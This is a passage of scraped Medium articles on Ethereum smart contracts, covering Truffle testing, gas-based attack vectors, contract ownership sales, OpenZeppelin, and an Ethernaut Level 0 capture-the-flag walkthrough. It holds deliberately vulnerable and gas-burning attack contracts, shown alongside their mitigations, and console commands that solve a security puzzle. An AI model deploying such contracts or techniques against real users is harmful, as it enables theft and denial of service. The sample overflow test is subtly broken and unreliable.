then it the test will be positive.Congratulation! You just wrote a test for your smart contract. Let\u2019s add another one for the remaining function of the contract:it('should mark one of your to-dos as completed', async () => {   await contractInstance.addTodo('example')   await contractInstance.markTodoAsCompleted(0)   const lastTodoAdded = await contractInstance.todos(accounts[0], 0)   const isTodoCompleted = lastTodoAdded[3] // 3 is the bool isCompleted value of the todo note   assert(isTodoCompleted, 'The todo should be true as completed')})That test is checking if one of the existing notes is being successfully marked as completed by first adding a note and then executing the markTodoAsCompleted() function.It\u2019s time to execute those tests to see if they are working or not.The way you execute the tests is by creating a test blockchain which is just an empty virtual Ethereum blockchain created in node.js where you can do whatever you want without real costs and immediately, without waiting for the miners to process the transaction.To do that, you have to install the testrpc module which has been renamed to ganache-cli from npm:npm i -g ganache-cliNote that the before the change, the plugin was called ethereumjs-testrpc, you may have seen that name before.After installing the module, execute that test blockchain with:ganache-cliYou\u2019ll see that a test blockchain has been created on localhost:8545 . Now you need to change the configuration of your truffle.js file to let him know that you want to use that localhost:8545 network for the tests.Open your truffle.js file and type this content:module.exports = {   networks: {      development: {         host: 'localhost',         port: 8545,          network_id: '*'      }   }}Open a new terminal, go to your project folder and execute the following for starting the tests:truffle test --developmentThe --development flag it\u2019s telling truffle to use the development network that we just created in the truffle.js configuration file.It\u2019s highly probable that you get warnings because of some errors in your smart contract. Simply fix those and execute the command again.If you did everything correctly you\u2019ll see that your tests are compiling. Some of them will pass, some won\u2019t. Your goal is to create good tests that don\u2019t pass to detect possible vulnerabilities. In my case all of them are passing:Great. You now know how to write tests, how to execute them and how to fix them. Go ahead and read the final section where you\u2019ll learn the most important aspect of testing. What, when and how to test all your functions.3. The 5 things that you must test in any contractMost of the contracts have the same range of possible vulnerabilities. Here I want to tell you what to look for when testing. Where most of the problems are located.1.- Always check for overflows and underflows. If you are making any sort of mathematical calculation, you have to make sure that you code is not overflowing or underflowing. Those words just mean that you exceed the capacity of a uint type of variable and thus the value of that variable resets and goes to 0 again after trying to store a gigantic number.For instance. Let\u2019s say that you have a smart contract with a similar function to this one:function sumNumbers(uint256 numberA, uint256 numberB) public view returns(uint256) {   return numberA + numberB;}That function is at risk of an overflow. You can execeed the maximum value of a uint256 type of variable if you try to sum 2 numbers that are bigger than 2\u00b2\u2075\u2076.In that case you could write a test like this one where you are testing if the sum is overflowing by checking the final value:it('the sum should not overflow', async () => {   try {      // Trying to sum 2^256 + 5, which should overflow and throw an exception in the best case      const sumResult = contractInstance.sumNumbers(2e256, 5)      assert.ok(false, 'The contract should throw an exception to avoid overflowing and thus making bad calculations')   } catch(error) {      assert.ok(true, 'The contract is throwing which is the expected behaviour when you try to overflow')   }})2.- Check that the return values of your functions are always within the range of the expected values. For instance if you have a function that is expected to return numbers bigger than 0, make a test where you are forcing a 0 return to see if it\u2019s rejecting that situation or not. Which brings us to the next point\u20263.- Always test the limits of the functions. If a function is returning a number, write a test where you execute it with the biggest possible number, another test with the smallest possible number and another with a random value in the middle. You never know how your functions will react in unexpected situations.4.- Make sure that the return values are properly formated. If you have a function that is supposed to return an array of numbers, check if there\u2019s any case where that array returns empty. This is important because it could break the functionality of your decentralized application.5.- If you have functions with parameters like this one:function doSomething(string randomText, uint256 randomNumber) public {}Make sure that the string and the uint256 parameters are rejecting invalid values. Write a test where the string is empty, write another where the string is a massive text of 10 thousand words, write a test where the uint is zero, where it\u2019s negative, where it\u2019s a gigantic number and so on.You have to make sure that your contract is ready for all the possible values of the parameters of your functions to avoid security risks.ConclusionCongratulations! You now know how to properly test a smart contract. You\u2019ve become a better developer which makes you more valuable. Give yourself a hug for being such a great person! For real.Now if you have any questions, if your tests are not working or if you just want to share the love, make sure to leave a comment with your problem and me or any other user will help you get out.Did you learn something useful? Do you think this article is worth your time? If so, clap it 50 times and share it with your fellow developers on linkedin, twitter and facebook, they will thank you for that.If you want to really go further and become a fully skilled Ethereum Developer, check my book which is 100% free for kindle unlimited users on amazon here: https://www.amazon.com/dp/B07BJB1YNQThanks for your time.", "responses": 8, "tags": ["Ethereum", "Testing", "Smart Contrac", "Solidity", "Blockchain"]}, {"title": "Problems & Costs of Smart Contract Development", "post_link": "https://medium.com/hackernoon/problems-costs-of-smart-contract-development-e86e9446ba9e?source=search_post", "author_name": "Michiel Mulders", "author_link": "https://medium.com/@michielmulders", "publish_date": "2018-03-25", "last_modified_date": "2018-06-17", "readtime": "2.23", "claps": 679, "voters": 59, "content": "Problems & Costs of Smart Contract DevelopmentCan your business afford it?Michiel MuldersFollowMar 25, 2018 \u00b7 3 min readImage by Gratisography.comThe problem with smart contracts is that most small and medium businesses are unable to implement smart contracts not only due to technological complexity but mostly because of their expensiveness. The costs for smart contract development are skyrocketing as there is an increasing demand for smart contract developers and contracts for ICOs.Why smart contracts are so great in the first place?Smart contracts, which are, actually, a self-executing code on blockchain that automatically implements the terms of an agreement between parties or business logic. It\u2019s basically an unbreakable agreement with predefined rules. In addition, smart contracts are deterministic which means the same output will be generated from a given initial state/input. Because of these properties, companies are keen to experiment with smart contracts to find opportunities for their business model. Being a first-mover gives a company many advantages like new clients, media attention, and more revenue.What\u2019s the actual cost of smart contract development?The development process itself is not only driving the costs. Proper auditing and testing are very expensive as this requires even more specialized niche knowledge to find bugs/faults in your smart contract code.A simple smart contract with no complex business logic costs around $7,000. More advanced contracts cost up to $45,000 and more. It\u2019s not uncommon large organizations with specialized knowledge ask up to $100,000. In addition, don\u2019t forget about the costs for deploying your contract on the main net. The complexity of your contract defines the price.It\u2019s even possible to calculate the exact gas price of your smart contract. If you do a quick google search for \u2018Gas Costs from Yellow Paper\u2019 you will find this spreadsheet. Each operation is listed in the spreadsheet with the gas price for executing it. For example, using the \u2018addition\u2019 operation costs you 3 gas (which is very low). If you have a more complex contract, it\u2019s not easy to calculate this. The Mist wallet, for example, is capable of making a rough estimation of the actual gas cost when deploying your contract.Spreadsheet Gas Costs EthereumSolving the price problemThe problem with smart contracts is that most small and medium businesses are unable to implement smart contracts not only due to technological complexity but mostly because of their expensiveness.iOlite is solving this problem using their Fast Adaptation Engine (FAE). Contributors, smart contract experts, can define structures linked to smart contract code. Through machine training, the FAE is capable of understanding more complex language, resulting in the creation of better smart contracts. Best of all, the FAE doesn\u2019t charge you any money for the development of a smart contract. On the other side, contributors are rewarded with iLT tokens through the mining process. The mining process occurs when a solution has been found for a specific input.If you want to know more about iOlite, check out their Medium or join them on Telegram.", "responses": 4, "tags": ["Blockchain", "Ethereum", "Blockchain Technology", "Solidity", "Ethereum Blockchain"]}, {"title": "Silent But Vulnerable: Ethereum Gas Security Concerns", "post_link": "https://medium.com/consensys-diligence/silent-but-vulnerable-ethereum-gas-security-concerns-adadf8bfb180?source=search_post", "author_name": "Steve Marx", "author_link": "https://medium.com/@smarx", "publish_date": "2018-12-18", "last_modified_date": "2019-01-25", "readtime": "5.61", "claps": 448, "voters": 62, "content": "Silent But Vulnerable: Ethereum Gas Security ConcernsSteve MarxFollowDec 18, 2018 \u00b7 6 min readPhoto by Mahkeo on UnsplashEvery transaction sent to the Ethereum blockchain requires a nontrivial amount of work to process. Gas is how that work is measured and paid for. Users tend to think of gas as a confusing annoyance, and developers think of it in terms of optimizing their costs.As a smart contract auditor, I often think of gas as a potential attack vector. In this post, I\u2019ll examine three ways that gas can lead to security vulnerabilities. The third issue is one that I haven\u2019t seen written about before.He who sent it spent itA fundamental truth about transactions is that they\u2019re paid for by the sender\u2014the account that signed the transaction.This fact can result in an attack vector if:An attacker can cause you to send a transaction, andThey can cause that transaction to consume a lot of gas.The first condition isn\u2019t difficult to satisfy. If I own an account at a centralized exchange (e.g. Coinbase), I can instruct the exchange to transfer funds to an account of my choosing. A typical implementation involves the exchange sending a transaction from one of their accounts. Because the exchange is sending the transaction, they are paying for gas.Satisfying the second condition is easy for a smart contract developer. Smart contracts can run arbitrary code in response to an incoming transaction. The following smart contract burns a bunch of gas when it receives an ether transfer:pragma solidity 0.5.1;contract GasBurner {    uint256 counter;    function() external payable {        for (uint256 i = 0; i < 100; i++) {            counter += 1;        }    }}The sender of a transaction specifies an upper bound on how much gas will be consumed, known as a gas limit. This limit is often determined automatically by simulating the transaction and seeing how much gas will be consumed. If an exchange does this, they\u2019re vulnerable to being tricked into consuming large quantities of gas.Further readingThe above code burns the gas pointlessly, but it could be put to a more productive use. Perhaps the attacker\u2019s contract could do some valuable computation with that gas. As Level K recently observed, a great use for excess gas is to use it to mint GasTokens, which can be turned around and sold.MitigationTo keep yourself safe from this sort of exploit, make sure that you always set a reasonable gas limit on your transactions.He who filled it killed itBecause Ethereum\u2019s computing resources are finite, there\u2019s a limit to how much gas can be used in a single block. This is known as the block gas limit. Miners try to pack transactions into a block to get as close as possible to that gas limit because the gas fees are paid to the miner.At the time of this writing, the block gas limit for the Ethereum main network is about 8,000,000. A transaction that consumes more gas than that cannot be mined at all.This can become a denial of service attack vector\u2014a way for an attacker to stop a smart contract from being able to function. The following is an example of a vulnerable contract:pragma solidity 0.5.1;contract TerribleBank {    struct Deposit {        address depositor;        uint256 amount;    }    Deposit[] public deposits;        function deposit() external payable {        deposits.push(Deposit({            depositor: msg.sender,            amount: msg.value        }));    }        function withdrawAll() external {        uint256 amount = 0;        for (uint256 i = 0; i < deposits.length; i++) {            if (deposits[i].depositor == msg.sender) {                amount += deposits[i].amount;                delete deposits[i];            }        }                msg.sender.transfer(amount);    }}If the deposits array gets long enough, it will no longer be possible to call withdrawAll(), because such a transaction wouldn\u2019t fit within a block. An attacker can easily cause this condition by calling deposit() repeatedly until the right array length is reached. This would lock all existing ether in the contract.It\u2019s also possible to mount a denial of service attack on the entire blockchain by completely filling up blocks with your transactions. As long as those transactions specify a generous enough gas price, rational miners will include the attacker\u2019s transactions at the exclusion of all others.Futher readingSWC-128, \u201cDoS With Block Gas Limit,\u201d describes the general class of bugs.\u201cMadMax: surviving out-of-gas conditions in Ethereum smart contracts\u201d by Grech et al. is a recent academic paper from OOPSLA\u201918 that attempts to measure how many smart contracts are vulnerable to block gas limit attacks.The FOMO3D prize, worth millions of dollars, was claimed by someone who successfully mounted a \u201cblock stuffing attack.\u201dMitigationSmart contract auditors start sweating as soon as they see a for loop. Avoid them where possible, unless they\u2019re bounded by a small constant number of iterations.Block stuffing attacks are expensive to mount, so to mitigate them, design your contracts to minimize the financial impact of fixed deadlines. For example, an auction often has a deadline for accepting bids, so a block stuffing attack could prevent people from bidding. Make sure the goods being auctioned off in such a system are not valuable enough that a block stuffing attack becomes financially viable.He who relayed it paid itFinally, I\u2019d like to examine a vulnerability class that I haven\u2019t seen described before.As a workaround for the rule that \u201che who sent it spent it,\u201d I\u2019ve seen a lot of recent discussion about so-called \u201cmeta transactions.\u201d A meta transaction is a lot like a transaction but is able to be relayed by a third party. The third-party relayer is the account actually sending the transaction, so it pays for the gas.This trick is accomplished via a signature and a proxy contract. The user signs their meta transaction and broadcasts it to the world. Anyone who sees the meta transaction can relay it to the proxy contract. As long as the message contains a valid signature, the proxy contract will execute the specified call. The relayer is often paid (e.g. with a token) to cover their expenses.The relayer has an unusual attack vector in such a scheme. As the transaction sender, they get to dictate how much gas they provide. By providing too little gas, they can cause the call to fail. This is a problem if they have incentive to do that, as in the following contract:pragma solidity 0.5.1;contract IERC20 {    function transfer(address target, uint256 amount) external returns (bool);}contract RelayProxy {    address owner = msg.sender;    uint256 nonce = 0;    IERC20 token = IERC20(0x...);    function execute(        address payable target,        bytes calldata data,        uint256 _nonce,        uint8 v,        bytes32 r,        bytes32 s    )        external    {        uint256 startGas = gasleft();        require(_nonce == nonce, \"Bad nonce.\");        bytes32 h = hash(target, data, _nonce);        require(ecrecover(h, v, r, s) == owner, \"Bad signature.\");        (bool success, ) = target.call(data);        if (success) {            nonce += 1;        }        // pay relayer for consumed gas in tokens        require(token.transfer(msg.sender, startGas - gasleft()));    }        function hash(        address target,        bytes memory data,        uint256 _nonce    )        internal        pure        returns (bytes32)    {        return keccak256(abi.encodePacked(target, data, _nonce));    }}A nonce is used to prevent replay attacks, but note that the nonce is only incremented when the call succeeds. A malicious relayer can, by manipulating the gas limit, cause the call to fail repeatedly. Each time the relayer calls execute, they get paid for whatever gas gets used.MitigationA tempting solution is to increment the nonce regardless of the success or failure of the call, but this opens up a denial of service attack vector. Every time the user broadcasts their meta transaction, a malicious relayer can pick it up and cause it to fail as before. Now that the nonce has been incremented, the user needs to sign a new meta transaction, and the process repeats.Another tempting solution would be to revert the transaction if the call fails, but this means it\u2019s impossible to compensate relayers when calls fail for legitimate reasons.The best solution is to directly address the root problem, which is that the relayer is allowed to specify the transaction\u2019s gas limit. To lock this down, be sure to include a gas limit in the signed message and check that it\u2019s being obeyed in the proxy contract. This is the approach taken in Status\u2019s relay proxy.Christian Lundqvist\u2019s \u201csimple multisig wallet\u201d mitigates this issue primarily by allowing the user to dictate the transaction sender as part of their signed message. This means a malicious relayer can\u2019t get involved in the first place.SummaryFailing to take proper care with gas can lead to serious smart contract vulnerabilities. When reading code, such vulnerabilities are often invisible, but they really stink.", "responses": 5, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Security"]}, {"title": "A Protocol for Sellable Smart Contracts", "post_link": "https://medium.com/free-code-camp/a-protocol-for-sellable-smart-contracts-829bc2ce02b3?source=search_post", "author_name": "Pablo Ruiz", "author_link": "https://medium.com/@pabloruiz55", "publish_date": "2017-12-23", "last_modified_date": "2018-06-21", "readtime": "5.37", "claps": 460, "voters": 62, "content": "Photo by Jezael Melgoza on UnsplashA Protocol for Sellable Smart ContractsPablo RuizFollowDec 23, 2017 \u00b7 6 min readEthereum doesn\u2019t have the concept of smart contract ownership built into it.Even though the creation and deployment of a smart contract is done by an account \u2014 be it an External Owned Account (EOA) or another contract \u2014 being the creator of the smart contract doesn\u2019t give the account any special privileges over the contract they deployed.Most use cases for smart contracts require someone to own the contracts. This \u201cowner\u201d is given privileges \u2014 and responsibilities \u2014 over the smart contract.In a crowdsale contract they might be tasked with managing the whole process and pausing the crowdsale if something goes wrong.In a Lottery/Ruffle Dapp they might be tasked with executing the number draw.In any contract that holds funds, they might be set as the beneficiary upon construct destruction.Photo by Ricardo Resende on UnsplashA common pattern used by many smart contracts is to set the owner to the account deploying the contract like so:pragma solidity 0.4.19;contract MyContract {  address owner;  function MyContract(){    owner = msg.sender;  }}Then, adding a modifier:modifier onlyOwner {  require(msg.sender == owner);  _;    }And finally, using that modifier to enforce that critical operations can only be performed by the owner of the contract:// Suicide the contract and transfer funds to the owner// Only available to the owner, for obvious reasons.function destroyContract() public onlyOwner {  selfdestruct(owner);}The Problem with Changing Contract OwnershipThere are some situations that would require ownership of a contract to be given to someone else. To name a few:The person that deployed the contract did it on behalf of someone elseA developer or consultant doing a contracting job for a companyA company wants to liquidate / sell its assets, which include smart contractsWhich might or not have ether balanceThe owner of the smart contract wants to give it away, donate it, or just flip it for profitPhoto by rawpixel.com on UnsplashSome contracts, but unfortunately not many, include a function to give ownership of the contract to some other account. And some of them also include another function for that person to accept the ownership that has been bestowed upon him.function changeOwner(address _newOwner)public onlyOwner {  ownerCandidate = _newOwner;}function acceptOwnership()public {  require(msg.sender == ownerCandidate);    owner = ownerCandidate;}Now, the situations mentioned above share a few common issues that these not-so-widely-used changeOwner() and acceptOwnership() functions don\u2019t address:How can the buyer of the contract be certain that once they pay for the ownership of the contract, the seller will actually execute the corresponding changeOwner() function?This can happen the other way around. How can the seller of the contract be certain that they will get paid if they cede ownership first?How can the buyer of the contract be certain that the current owner of the contract will not modify it (well, it\u2019s data) before giving away its ownership?The Sellable Contract ProtocolThe solution I propose is implementing a series of functions that would allow the owner of a smart contract to sell it in exchange of ether to someone of his choosing or just put it up for sale for anyone to buy at the asking price on a first-come first-save basis. This could be extended to allow different sale methods using different auction styles.The details of the protocol can be read \u2014 and discussed \u2014 on the corresponding EIP.In the following paragraphs I\u2019ll go through an implementation example, which is available on my Github Repository.Handling OwnershipHandling ownership of the contract is pretty basic. As typically done, we set the owner of the deployed contract to msg.sender upon initialization:function Sellable() public {        owner = msg.sender;        Transfer(now,address(0),owner,0);    }Then, we add the onlyOwner modifier, which will be used on every function that we want to make only executable by the person currently owning the contract:modifier onlyOwner {        require(msg.sender == owner);        _;    }What we\u2019ll want our contract to do is to allow the owner to be changed under certain conditions.Putting the Contract for SaleThe owner of the contract can put it up for sale by calling the following function:function initiateSale(uint _price, address _to) onlyOwner public {        require(_to != address(this) && _to != owner);        require(!selling);                selling = true;                // Set the target buyer, if specified.        sellingTo = _to;                askingPrice = _price;    }initiateSale() takes two parameters:uint _price: which is the price the owner wants to sell the contract for.address _to: which is optional, and corresponds to who the owner wants to sell the contract to.When putting the contract up for sale, the owner has two options: They can choose the buyer, in that case the sale has been prearrange. Or they can simply \u201cannounce\u201d the contract is for sale and the first person to claim it (and paying its price) gets it.Additionally, the asking price can be set to 0. This means that the owner of the contract is allowed to gift, donate or give the contract away.There\u2019s one more important thing to notice: There\u2019s a ifNotLocked modifier that can be added to the contract\u2019s functions to prevent them from being executed if the contract is in a sale process. If used properly, this prevents the contract\u2019s data from being modified just before it is purchased.Finally, there\u2019s the cancelPurchase() function which allows the owner to cancel the sale before someone completes it.function cancelSale() onlyOwner public {        require(selling);                // Reset sale variables        resetSale();    }Buying the ContractOnce the contract is up for sale, all it takes to complete the sale is for the buyer (if it was specified) or anyone (if no particular buyer was specified) to call the following function:function completeSale() public payable {        require(selling);        require(msg.sender != owner);        require(msg.sender == sellingTo || sellingTo == address(0));        require(msg.value == askingPrice);                // Swap ownership        address prevOwner = owner;        address newOwner = msg.sender;        uint salePrice = askingPrice;                owner = newOwner;                // Transaction cleanup        resetSale();                prevOwner.transfer(salePrice);                Transfer(now,prevOwner,newOwner,salePrice);    }The completeSale() function is a payable function which requires the ether to be sent. The amount to be sent must be the exactly the same the owner set as the asking price.When completeSale() is executed, the ether will be transferred to the owner and then the ownership will be transferred to the buyer. This finishes the transaction and cleans up the contract for the new owner, who can now use it normally, or even put it up for sale again.An Example Use CaseHere\u2019s a very simple example of how this base contract could be used:contract Kitty is Sellable {        string public name;    uint public kittyValue = 0;        function Kitty(string _name) public {        name = _name;    }        function findNewOwner() public onlyOwner {        kittyValue = kittyValue + 1 ether;           super.initiateSale(kittyValue,address(0));    }        function renameKitty(string newName) ifNotLocked public onlyOwner {        name = newName;    }        function buyKitty() public payable {        require(msg.value == kittyValue);        super.completeSale();    }}We have a contract which represents a CryptoKitty \ud83d\ude3a. The owner can findNewOwner() to put it up for sale. Each time the kitty is bought his value increases by 1 ether. The owner of the kitty can change its name, as long as it is not being sold at the moment by implementing the ifNotLocked modifier in renameKitty .That\u2019s it!If you have further suggestions to improve this Sellable protocol, please add your comments, bugs or suggestions in the EIP I created.Photo by Jonas Vincent on Unsplash", "responses": 1, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Programming", "Blockchain"]}, {"title": "dYdX Launches on Testnet", "post_link": "https://medium.com/dydxderivatives/dydx-launches-on-testnet-38b2812c56e?source=search_post", "author_name": "Antonio Juliano", "author_link": "https://medium.com/@ajuliano", "publish_date": "2018-06-05", "last_modified_date": "2018-06-21", "readtime": "1.41", "claps": 702, "voters": 58, "content": "dYdX Launches on TestnetAntonio JulianoFollowJun 5, 2018 \u00b7 2 min readWe\u2019re excited to announce the dYdX Margin Trading Protocol has launched on the Kovan Testnet! Along with the launch, we\u2019re also open sourcing the smart contract code for the protocol.The launch includes:The base dYdX Margin Trading ProtocolShort & Leveraged Long TokensThe 0x exchange wrapper, which allows any 0x order to be used with dYdXA shared lending contract that lets multiple lenders participate in a margin loanERC-721 positions and loansAn opt-in dutch auction contract that can automatically close positionsThe most accurate and efficient compound interest calculator on EthereumOur protocol smart contracts are some of the most sophisticated to exist on Ethereum to this point. We have built them in a modular way that allows many features to be built on top and easily upgraded without sacrificing decentralization.We\u2019ve also invested heavily in testing and audits to ensure the contracts are as secure as possible. We\u2019ve built an extremely rigorous test suite with 100% test coverage on both lines and branches for all of the more than 10,000 Solidity lines of our smart contracts. Additionally, our contracts are being audited separately by multiple top security firms. Once these audits are complete we\u2019ll start rolling out to mainnet.In the coming months we\u2019ll be releasing user facing applications that make it simple for users to use dYdX. We are also hard at work building libraries that will help developers build on top of the protocol. For any questions, please reach out on our Slack and stay tuned for some upcoming technical posts that dive into more detail on our protocol!If you\u2019re interested in joining us in building state-of-the-art smart contracts and decentralized applications check out our job postings or reach out to us at jobs@dydx.exchange. We\u2019re rebuilding the core of the world\u2019s biggest financial market and are always looking for talented individuals to join the team!", "responses": 4, "tags": ["Ethereum", "Dydx", "Solidity", "Decentralized Exchange", "Dapps"]}, {"title": "The Joy of Minimalism in Smart Contract Design", "post_link": "https://medium.com/solidified/the-joy-of-minimalism-in-smart-contract-design-b67fb4073422?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2018-04-11", "last_modified_date": "2018-06-20", "readtime": "2.57", "claps": 433, "voters": 54, "content": "The Joy of Minimalism in Smart Contract DesignRob HitchensFollowApr 11, 2018 \u00b7 3 min readWe all know blockchains and smart contracts provide unmatched assurances about unstoppable logic and immutable data. As attractive as that sounds, it\u2019s best to use it as sparingly as possible. A well-crafted, minimalist contract only addresses concerns that cannot be addressed any other way.\u201cIf a concern can possibly be addressed outside of a smart contract, then that\u2019s what we should do.\u201dThat may seem strange coming from someone who specializes in helping others maximize utility of smart contracts and blockchains. It\u2019s not a contradiction. Blockchains and smart contracts are an extraordinary solution. It\u2019s best to reserve it for extraordinary problems. Use it to create trust and resolve uncertainty \u2014 nothing routine.For example, if you merely want to award points, countless examples existed long before blockchain. On the other hand, if you want to prove that those points are always and will always be awarded by a disclosed formula, then you may need to make the formula an observable fact on the blockchain. That would be solving for trust in the meaning of the scores.This interpretation implies a narrow scope of concerns a smart contract should address. Contracts;define the essential, enduring facts about the application,provide the authoritative record of the facts that all participants can refer to in order to know they have the correct information, andprovide evidence of application integrity via immutable processes that prevent corruption in any form.With those concerns attended to, it\u2019s usually a good idea to make the complete state conveniently discoverable and completely auditable. Beyond these core concerns are details that can be attended to by clients.Consider the idea of sorting the data in the contract or finding a way to search it and filter it efficiently. It might be very useful, perhaps even critical to the overall solution. Even so, high importance doesn\u2019t imply that the implementation belongs at the smart contract level.Given that:the data in the contract is completely discoverable,state changes emit events in real time (they should), andclients can inspect the state, listen to events, or both,software clients can employ a range of strategies to discover the facts they need in any given moment. Minimalist contract design provides the toolbox for constructing an appropriate client-side implementation without attempting to do the software client\u2019s job. Indeed, the author would argue that client-side convenience shouldn\u2019t influence contract design.Whether it\u2019s a browser app or a massive cluster of caching servers, the contract\u2019s posture toward the outside world is the same.The state is completely discoverable.State changes are (should be) broadcast by event emitters.Any off-chain caching strategy is acceptable but the contract\u2019s version of the facts is always authoritative.Any off-chain query solution is acceptable.Any service that purports to perform these services can (and should) provide clients with all the necessary details clients would need to check the blockchain for themselves, if they want to.Knowing that a wide range of valid concerns will be attended to by off-chain processes greatly reduces the scope of functions that need to be coded inside a contract. A minimalist contract addresses only concerns that can\u2019t be addressed any other way.Minimalism leads to clarity about exactly what the contract needs to prove and the minimum logic and data required to construct the proof. Minimalism is the first defense against defects that might have non-trivial consequences. The ideal is something so simple that there are obviously no defects.\u201cObviously no defects\u201d is easier said than done, which is why an Audit and a Bug Bounty is an absolute must before any piece of software should be entrusted with significant value.When you\u2019re going for perfection, simple is better.", "responses": 1, "tags": ["Blockchain", "Smart Contracts", "Solidity", "Simplicity", "Ethereum"]}, {"title": "Ethernaut Lvl 0 Walkthrough: ABIs, Web3, and how to abuse them", "post_link": "https://medium.com/hackernoon/ethernaut-lvl-0-walkthrough-abis-web3-and-how-to-abuse-them-d92a8842d71b?source=search_post", "author_name": "Nicole Zhu", "author_link": "https://medium.com/@nicolezhu", "publish_date": "2018-08-13", "last_modified_date": "2018-09-17", "readtime": "2.29", "claps": 360, "voters": 55, "content": "Ethernaut Lvl 0 Walkthrough: ABIs, Web3, and how to abuse themMake a smart contract do things it didn\u2019t want to\u2026Nicole ZhuFollowAug 13, 2018 \u00b7 3 min readThis is a in-depth series around Zeppelin\u2019s smart contract security puzzles. I\u2019ll give you the direct resources and key concepts you\u2019ll need to solve the puzzles 100% on your own.Over the next weeks, we\u2019ll reproduce how some serious hacks were induced, notably:$50M DAO hack: resulting from a re-entrancy problem$30M Parity hack: induced by a delegatecall() exploitationRequired: Basic knowledge of smart contract developmentHow Ethernaut worksAll smart contract source code are compiled into two formats, by the Ethereum Virtual Machine (EVM):Application Binary Interface (ABI): a communication layer between solidity and Javascript, in JSON formatBytecode: the low level machine language that gets executed by the the EVMWhen you request get a new instance for each level, Ethernaut deploys the compiled bytecode to a new address on the Ropsten test network:Once this new instance is created on the blockchain, its address is returned to your web client through an event, as seen in the game\u2019s main contract, Ethernaut.sol:https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/Ethernaut.solFinally, Web3 wraps an ABI around this new contract instance, and allows you to interact with the contract through your web console.Notice that all `public` functions are available in the web clientDetailed WalkthroughThis level requires you to guess a secret password in order to \u201cget cleared\u201d to move on.Notice that Ethernaut passed a secret _password into the constructor, when it created your contract instance:function Instance(string _password) public {     password = _password; }2. This password is stored as a public string variablestring public password;3. All public, basic variable types in Solidity have an auto-generated getter function. This means you can directly read this not-so-secret password by typing into the console:await contract.password()You can use async/await to work with Web3 promises with more ease4. To pass this level, simply call the final authenticate function and pass in the retrieved password, via the console:await contract.authenticate(\"[password here]\");You\u2019ll be modifying storage in the authenticate function, so expect to pay some gas when calling this transaction.5. Finally, you should be able to double check if you\u2019ve passed this level:await contract.getCleared();Key Security TakeawaysAll functions and variables stored on the blockchain are viewable by the publicNever store passwords directly inside a smart contract, (not even as private variables, as we\u2019ll learn shortly)More LevelsEthernaut Lvl 1 Walkthrough: how to abuse the Fallback functionThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. I\u2019ll give you the direct resources\u2026hackernoon.comEthernaut Lvl 2 Fallout Walkthrough: how simple developer errors become big mistakesThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. I\u2019ll give you the direct resources\u2026medium.com", "responses": 2, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Security", "Hacking"]}, {"title": "OpenZeppelin Framework Proposal and Development Roadmap", "post_link": "https://medium.com/zeppelin-blog/zeppelin-framework-proposal-and-development-roadmap-fdfa9a3a32ab?source=search_post", "author_name": "Manuel Araoz", "author_link": "https://medium.com/@maraoz", "publish_date": "2016-09-14", "last_modified_date": "2019-02-13", "readtime": "4.48", "claps": 246, "voters": 74, "content": "OpenZeppelin Framework Proposal and Development RoadmapManuel AraozFollowSep 14, 2016 \u00b7 5 min readOpenZeppelin is a new smart contract development framework for the Ethereum Virtual Machine (EVM) focused on security, modularity, and code reusability. At Zeppelin Solutions, we started this initiative to gather the community around building new security standards and sharing efforts in smart contract development.Most of this proposal is based on our experience building and maintaining other open-source projects like Bitcore and Streamium. Feel free to give feedback on what you think could be improved.MotivationSmart contract security is hard. We need better tools for developers and teams to build the next generation of blockchain-based smart contract applications. There is yet no community-standard code to help write smart contracts in a safe way. We\u2019re introducing OpenZeppelin as a way to discuss, learn together, and build tools for a safer decentralized finance ecosystem.PrinciplesThe core development principles we want to base OpenZeppelin on are:Security in DepthWe strive to provide secure, tested, audited code. To achieve this, we need to match intention with function. Thus, documentation, code clarity, community review and security discussions are fundamental.Simple and ModularSimpler code means easier audits, and better understanding of what each component does. We look for small files, small contracts, and small functions. If you can separate a contract into two independent functionalities you should probably do it.Naming MattersWe take our time with picking names. Code is going to be written once, and read hundreds of times. Renaming for clarity is encouraged.TestsWrite tests for all your code. We encourage Test Driven Development so we know when our code is right. Even though not all code in the repository is tested at the moment, we aim to test every line of code in the future.Check pre-conditions and post-conditionsA very important way to prevent vulnerabilities is to catch a contract\u2019s inconsistent state as early as possible. This is why we want functions to check pre- and post-conditions for executing its logic. When writing code, ask yourself what you are expecting to be true before and after the function runs, and express it in code.Code ConsistencyConsistency on the way classes are used is paramount to an easier understanding of the library. The codebase should be as unified as possible. Read existing code and get inspired before you write your own. Follow the style guidelines. Don\u2019t hesitate to ask for help on how to best write a specific piece of code.Regular AuditsFollowing good programming practices is a way to reduce the risk of vulnerabilities, but professional code audits are still needed. We will perform regular code audits on major releases, and hire security professionals to provide independent review.For more info and a proposed code style guide check our CONTRIBUTING document on GitHub.ImplementationWe\u2019re starting with Solidity tools because Ethereum is currently the most popular smart contract development platform. Working with Solidity also makes our tools compatible with Rootstock and some private blockchain systems like IBM\u2019s Blue Horizon.But our vision of improving smart contract development security standards is platform agnostic. Our plans for the future involve working on tools for Bitcoin, Tendermint, Bloq Ora, or whatever platform developers are using to build smart contract apps.Some modules and components we\u2019re looking to implement soon for Solidity are:Pull payment helpers: Lots of security problems (including the infamous TheDAO hack) can be prevented by using a pull payment strategy (as opposed to pushing payments with `send`). We already have a simple PullPaymentCapable.sol contract, but more comprehensive tools, documentation and examples are needed.Contract life-cycle tools: Most contracts nowadays are deployed to the blockchain without much thought about what will happen to them in the future. We\u2019d love to build tools to better manage several contract death strategies, contract transfer of ownership, contract pausing and resuming, contract upgradeability, etc.Fault tolerance and Automatic bug bounties: Automatic detection of faults, and tools to recover from inconsistent states. Simple tools to limit the amount of funds managed by contracts. We\u2019re also working on, and looking to improve, bug bounty contracts to have automatic payouts to security researchers that can break our contract\u2019s invariants.Resusable basic components: Many common modules are still reimplemented from scratch for each new project. We\u2019re looking to build standard contracts for token issuance, crowdfunding, voting, betting, payroll, revenue sharing, etc.Explore formal verification ideas: Formal verification of contracts is an active research area. Integrating this work into OpenZeppelin can provide interesting security guarantees to our contracts. Formal verification means statically analyzing contract code to formally prove correctness and/or problems.Better oracle interfaces: An important part of smart contract development is how to interact with off-blockchain data sources. An interesting idea to explore is to do 